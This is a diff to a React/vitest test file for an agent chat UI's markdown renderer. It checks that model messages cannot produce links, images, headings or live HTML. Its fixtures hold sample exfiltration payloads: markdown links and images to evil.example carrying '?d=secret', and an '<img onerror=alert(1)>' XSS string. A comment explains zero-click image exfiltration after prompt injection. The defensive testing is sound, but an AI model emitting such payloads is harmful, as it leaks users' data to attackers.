@@ -537,7 +537,8 @@ test("waiting says which step is running, derived from the snapshot alone", asyn
 test("the line breaks the model wrote survive into the conversation", async () => {
   const v = sample();
   v.snapshot.messages = [
-    { role: "assistant", content: "這次試跑有條件沒過：\n1. 輸出沒有標題\n2. 少了日期欄" },
+    { role: "user", content: "請幫我做兩件事：\n1. 抓規格\n2. 寫草稿" },
+    { role: "assistant", content: "好。\n這一行還在同一段。" },
   ];
   vi.stubGlobal(
     "fetch",
@@ -547,14 +548,23 @@ test("the line breaks the model wrote survive into the conversation", async () =
   await resume();
   const text = box.querySelector(".creation-text")!;
   expect(text, "訊息本文沒有自己的元素，就沒有地方掛 white-space").not.toBe(null);
-  expect(text.textContent).toContain("1. 輸出沒有標題");
+  expect(text.textContent).toContain("1. 抓規格");
+  const para = box.querySelector('li[data-role="assistant"] p')!;
+  expect(para.textContent, "模型那一段裡的換行不見了").toBe("好。\n這一行還在同一段。");
   // vitest 的 jsdom 不載入 `index.css`，所以 `getComputedStyle` 在這裡永遠是空的
   // ——那樣的斷言會恆綠。改成直接讀那條規則，和 `design-system.test.ts` 解析設計
   // 文件是同一個做法：兩邊少一邊都紅。
+  //
+  // 兩條規則各守一半：`05` R-70 之後 `assistant` 走算繪器（換行落在段落上），
+  // `user` 與 `tool` 仍然是一個裸的文字節點（換行落在 `.creation-text` 上）。
   const css = readFileSync(join(import.meta.dirname, "index.css"), "utf8");
   expect(
     /\.creation-text\s*\{[^}]*white-space:\s*pre-wrap/.test(css),
     "`.creation-text` 沒有 pre-wrap，換行還是會被壓掉",
+  ).toBe(true);
+  expect(
+    /\.creation-md\s*>\s*p\s*\{[^}]*white-space:\s*pre-wrap/.test(css),
+    "`.creation-md > p` 沒有 pre-wrap，模型段落裡的換行會被壓掉",
   ).toBe(true);
 });
 /**
@@ -1328,4 +1338,134 @@ test("flag off never mounts creation or fetches its private sessions", async () 
   await render(<CreateHub generateExposed={false} creationExposed={true} />);
   expect(box.textContent).not.toContain("和 Agent 一起創作 Skill");
   expect(fetch).not.toHaveBeenCalled();
+});
+
+/**
+ * `05` R-70（2026-09-09 簽署）：模型訊息可以帶哪些標記。
+ *
+ * 允許的七種是好讀，排除的四種是安全。這一組測試分成兩半，而**第二半才是裁定的
+ * 內容**：能不能長出 `<strong>` 是體驗，能不能長出 `<a>` 與 `<img>` 是那份簽名。
+ */
+test("an assistant message renders the seven node types the ruling allows", async () => {
+  const v = sample();
+  v.snapshot.messages = [
+    {
+      role: "assistant",
+      content:
+        "我會分兩步做。\n第二行還在同一段。\n\n- 先讀規格\n- 再寫草稿\n\n1. 一\n2. 二\n\n用 `search_knowledge` 查，**這個很重要**，也有 *強調*。\n\n```\nconst x = 1;\n```",
+    },
+  ];
+  vi.stubGlobal(
+    "fetch",
+    vi.fn((url: string) => routeGet(url, [v], v)),
+  );
+  await render();
+  await resume();
+  const bubble = box.querySelector('.creation-log > li[data-role="assistant"]')!;
+
+  // `.creation-log` 自己是一個清單，而 `querySelectorAll` 的組合子是對整棵樹
+  // 解析的——`bubble.querySelectorAll("ol li")` 會把巢在裡面的 `ul` 的項目也算
+  // 進去。所以直接數那個元素自己的子節點。
+  expect(bubble.querySelector("ul")!.children.length, "無序清單").toBe(2);
+  expect(bubble.querySelector("ol")!.children.length, "有序清單").toBe(2);
+  expect(bubble.querySelector("code")!.textContent).toBe("search_knowledge");
+  expect(bubble.querySelector("strong")!.textContent).toBe("這個很重要");
+  expect(bubble.querySelector("em")!.textContent).toBe("強調");
+  expect(bubble.querySelector("pre")!.textContent).toBe("const x = 1;");
+  // 04 丙-207 的換行不能被這個算繪器吃掉：同一段裡的第二行還在那一段裡。
+  const paras = bubble.querySelectorAll("p");
+  expect(paras[0].textContent).toBe("我會分兩步做。\n第二行還在同一段。");
+  // 標記本身不留在字面上。
+  expect(bubble.textContent).not.toContain("**");
+  expect(bubble.textContent).not.toContain("```");
+});
+
+/**
+ * 這是 R-70 真正在簽的那一條，而它的理由不是 XSS：一張圖片**不需要任何人點**——
+ * 畫面一算繪，瀏覽器就去抓那個網址，網址裡帶著模型剛讀到的東西。AgentFlayer、
+ * EchoLeak、Copilot Chat 與 Gemini 都是這個形狀。所以測的不是「有沒有消毒」，
+ * 是**那兩種節點根本長不出來**。
+ */
+test("no assistant message can produce a link or an image, whatever it writes", async () => {
+  const v = sample();
+  v.snapshot.messages = [
+    {
+      role: "assistant",
+      content:
+        "看這裡 [說明](https://evil.example/?d=secret) 和 ![圖](https://evil.example/pixel.png?d=secret)\n\n" +
+        "裸網址 https://evil.example/bare 也一樣。\n\n" +
+        '<a href="https://evil.example">html</a> 與 <img src=x onerror=alert(1)>\n\n' +
+        "## 這不是標題",
+    },
+  ];
+  vi.stubGlobal(
+    "fetch",
+    vi.fn((url: string) => routeGet(url, [v], v)),
+  );
+  await render();
+  await resume();
+  const bubble = box.querySelector('.creation-log > li[data-role="assistant"]')!;
+
+  expect(bubble.querySelector("a"), "模型寫的連結變成了可以點的連結").toBe(null);
+  expect(bubble.querySelector("img"), "模型寫的圖片變成了會自己發請求的 <img>").toBe(null);
+  expect(bubble.querySelector("h1,h2,h3,h4,h5,h6"), "訊息長出了和頁面打架的標題").toBe(null);
+  // 原始 HTML 是字，不是標記——React 轉義，這裡沒有任何一處把它還原。
+  expect(bubble.textContent).toContain('<a href="https://evil.example">html</a>');
+  expect(bubble.textContent).toContain("<img src=x onerror=alert(1)>");
+  // 排除掉的東西以字面留著：讀的人看到模型到底寫了什麼，而不是看到一個空缺。
+  expect(bubble.textContent).toContain("[說明](https://evil.example/?d=secret)");
+  expect(bubble.textContent).toContain("## 這不是標題");
+});
+
+/**
+ * 範圍條款。`tool` 維持純文字不是美觀選擇：`fetch` 那種訊息裝的是抓回來的整頁
+ * 網頁，是攻擊者**直接寫的**字，不必先騙過模型——它比模型輸出更不可信。`user`
+ * 則是使用者自己打的，沒有理由替他解讀。
+ */
+test("only assistant messages are rendered as markup; tool and user stay text", async () => {
+  const v = sample();
+  const injected = "**粗體** 與 [連結](https://evil.example) 和 `code`";
+  v.snapshot.messages = [
+    { role: "user", content: injected },
+    {
+      role: "tool",
+      content: JSON.stringify({
+        fetch: { url: "https://x/", status: "ok", bytes: 9, text: injected },
+      }),
+    },
+  ];
+  vi.stubGlobal(
+    "fetch",
+    vi.fn((url: string) => routeGet(url, [v], v)),
+  );
+  await render();
+  await resume();
+
+  const user = box.querySelector('.creation-log > li[data-role="user"]')!;
+  expect(user.querySelector("strong"), "使用者自己打的字被替他解讀了").toBe(null);
+  expect(user.textContent).toContain("**粗體**");
+
+  const tool = box.querySelector('.creation-log > li[data-role="tool"]')!;
+  expect(tool.querySelector("strong"), "抓回來的網頁被升格成標記了").toBe(null);
+  expect(tool.querySelector("a"), "抓回來的網頁長出了連結").toBe(null);
+  expect(tool.textContent).toContain("**粗體**");
+});
+
+/**
+ * `_` 不算強調。這個 app 的訊息裡到處都是 `snake_case`（`search_knowledge`、
+ * `allowed_tools`、`content_hash`），而那正是讀的人最需要看清楚的東西——把它們
+ * 切成斜體會改掉一個識別字的樣子。
+ */
+test("underscores in identifiers are not emphasis", async () => {
+  const v = sample();
+  v.snapshot.messages = [{ role: "assistant", content: "欄位是 allowed_tools 與 content_hash。" }];
+  vi.stubGlobal(
+    "fetch",
+    vi.fn((url: string) => routeGet(url, [v], v)),
+  );
+  await render();
+  await resume();
+  const bubble = box.querySelector('.creation-log > li[data-role="assistant"]')!;
+  expect(bubble.querySelector("em"), "識別字裡的底線被當成強調").toBe(null);
+  expect(bubble.textContent).toContain("allowed_tools 與 content_hash");
 });
